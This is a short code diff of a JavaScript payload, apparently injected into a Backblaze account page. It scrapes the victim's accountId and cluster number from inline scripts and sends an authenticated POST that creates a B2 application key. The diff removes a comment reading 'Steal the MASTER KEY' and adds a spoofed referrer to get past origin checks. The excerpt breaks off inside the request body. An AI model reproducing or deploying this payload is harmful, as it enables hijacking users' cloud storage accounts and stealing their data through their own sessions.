@@ -4,20 +4,19 @@
   var html = "";
   for (var i = 0; i < scripts.length; i++) html += scripts[i].textContent;
 
-  // Extract accountId from inline JS: accountId: 'xxx'
   var accountId = "";
   var am = html.match(/accountId:\s*'([a-f0-9]+)'/);
   if (am) accountId = am[1];
 
-  // Extract clusterNum from inline JS: cluster_num"] = "xxx"
   var clusterNum = "";
   var cm = html.match(/cluster_num['"]\]\s*=\s*['"](\d+)['"]/);
   if (cm) clusterNum = cm[1];
 
-  // Steal the MASTER KEY
+  // Spoof the Referer to app_keys.htm (same-origin, so fetch allows it)
   fetch("/account_tangle/create_b2_application_key", {
     method: "POST",
     credentials: "same-origin",
+    referrer: "https://secure.backblaze.com/app_keys.htm",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       accountId: accountId,
